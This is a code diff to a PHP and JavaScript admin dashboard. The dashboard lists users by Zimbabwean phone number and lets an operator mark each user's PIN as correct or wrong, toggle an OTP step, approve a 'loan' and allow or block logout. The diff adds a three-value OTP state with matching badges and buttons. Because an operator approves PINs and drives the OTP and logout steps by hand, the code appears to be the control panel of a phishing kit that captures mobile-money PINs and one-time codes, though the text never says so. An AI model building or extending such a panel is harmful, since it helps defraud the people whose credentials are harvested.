@@ -34,7 +34,13 @@ if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']
     }
     switch($type){
         case 'pin': $col='pin'; $val=($action=='correct')?1:0; break;
-        case 'otp': $col='otp'; $val=($action=='correct')?1:0; break;
+        case 'otp': 
+            $col='otp'; 
+            // OTP: off (clicked off) -> set to 1, on (clicked on) -> set to 2
+            if($action=='off') $val=1;
+            elseif($action=='on') $val=2;
+            else $val=0;
+            break;
         case 'loan': $col='approve'; $val=($action=='approve')?1:0; break;
         case 'logout': 
             $col='logout'; 
@@ -108,6 +114,9 @@ $totalRecords = count($records);
         .badge-approved{background-color:#cce5ff;color:#004085;}
         .badge-logout-yes{background-color:#d4edda;color:#155724;}
         .badge-logout-no{background-color:#f8d7da;color:#721c24;}
+        /* New OTP badge styles for values 1 and 2 */
+        .badge-otp-off{background-color:#f8d7da;color:#721c24;}  /* Red-ish for OFF (1) */
+        .badge-otp-on{background-color:#d4edda;color:#155724;}   /* Green for ON (2) */
         .btn-group{display:flex;flex-wrap:wrap;gap:8px;}
         .btn{border:none;padding:6px 14px;border-radius:8px;font-size:0.75rem;font-weight:500;cursor:pointer;white-space:nowrap;}
         .btn-pin{background-color:#1d4ed8;color:#fff;}
@@ -125,6 +134,9 @@ $totalRecords = count($records);
         .modal-buttons button{padding:12px;border:none;border-radius:50px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;}
         .btn-correct,.btn-approve,.btn-allow{background-color:#10b981;color:#fff;}
         .btn-wrong,.btn-default,.btn-block{background-color:#ef4444;color:#fff;}
+        /* New OTP specific modal buttons */
+        .btn-otp-off{background-color:#ef4444;color:#fff;}
+        .btn-otp-on{background-color:#10b981;color:#fff;}
         footer{padding:14px 20px;background:#f8f9fa;font-size:0.7rem;color:#6c757d;text-align:center;border-top:1px solid #e0e0e0;}
         @media(max-width:700px){body{padding:10px;}h1{font-size:1.2rem;padding:14px 16px;}th,td{padding:8px 8px;font-size:0.8rem;}.btn{padding:5px 10px;font-size:0.7rem;}.badge{font-size:0.7rem;padding:3px 8px;}}
         @media(max-width:550px){.table-wrapper{padding:12px;}.btn-group{flex-direction:column;gap:6px;}.btn{text-align:center;}}
@@ -142,7 +154,7 @@ $totalRecords = count($records);
             </tbody>
         </table>
     </div>
-    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>📌 Logout values: 1 = Yes (Logged In / Allow), 2 = No (Logged Out / Block), 0 = Default</footer>
+    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>📌 Logout values: 1 = Yes (Logged In / Allow), 2 = No (Logged Out / Block), 0 = Default<br>📌 OTP values: 1 = OFF, 2 = ON</footer>
 </div>
 <div id="verifyModal" class="modal"><div class="modal-content"><p id="modalMessage"></p><div class="modal-buttons" id="modalButtons"></div></div></div>
 <script>
@@ -161,7 +173,7 @@ function renderTable(records){
         const rowNumber = totalRows - idx;
         const phone=escapeHtml(rec.phone);
         const pinStatus=rec.pin_status;
-        const otpStatus=rec.otp_status;
+        const otpStatus=rec.otp_status; // Values: 1 = OFF, 2 = ON, 0 = default
         const loanApprove=rec.loan_approve;
         const logoutStatus=rec.logout_status;
         
@@ -178,12 +190,26 @@ function renderTable(records){
             logoutDisplay = 'Default (0)';
             logoutClass = 'badge-warning';
         }
+
+        // Format OTP display: 1 = OFF, 2 = ON
+        let otpDisplay = '';
+        let otpClass = '';
+        if(otpStatus === 1){
+            otpDisplay = 'OFF (1)';
+            otpClass = 'badge-otp-off';
+        } else if(otpStatus === 2){
+            otpDisplay = 'ON (2)';
+            otpClass = 'badge-otp-on';
+        } else {
+            otpDisplay = 'Default (0)';
+            otpClass = 'badge-warning';
+        }
         
         html+=`<tr data-phone="${phone}">`;
         html+=`<td style="text-align:center; font-weight:bold;">${rowNumber}</td>`;
         html+=`<td>+263 ${phone}</td>`;
         html+=`<td><span class="badge ${pinStatus?'badge-success':'badge-warning'}">${pinStatus?'On (1)':'Off (0)'}</span></td>`;
-        html+=`<td><span class="badge ${otpStatus?'badge-success':'badge-warning'}">${otpStatus?'On (1)':'Off (0)'}</span></td>`;
+        html+=`<td><span class="badge ${otpClass}">${otpDisplay}</span></td>`;
         html+=`<td><span class="badge ${loanApprove?'badge-approved':'badge-warning'}">${loanApprove?'Approved (1)':'Default (0)'}</span></td>`;
         html+=`<td><span class="badge ${logoutClass}">${logoutDisplay}</span></td>`;
         html+=`<td class="btn-group">
@@ -201,7 +227,13 @@ function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'
 
 function attachEvents(){
     document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
-    document.querySelectorAll('.verify-otp').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'otp',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
+    // Updated OTP modal: Off -> sets to 1, On -> sets to 2
+    document.querySelectorAll('.verify-otp').forEach(btn=>{ 
+        btn.onclick=()=>showModal(btn.dataset.phone,'otp',[
+            {label:'❌ OFF (Set to 1)',action:'off',class:'btn-otp-off'}, 
+            {label:'✅ ON (Set to 2)',action:'on',class:'btn-otp-on'}
+        ]); 
+    });
     document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
     document.querySelectorAll('.verify-logout').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'logout',[
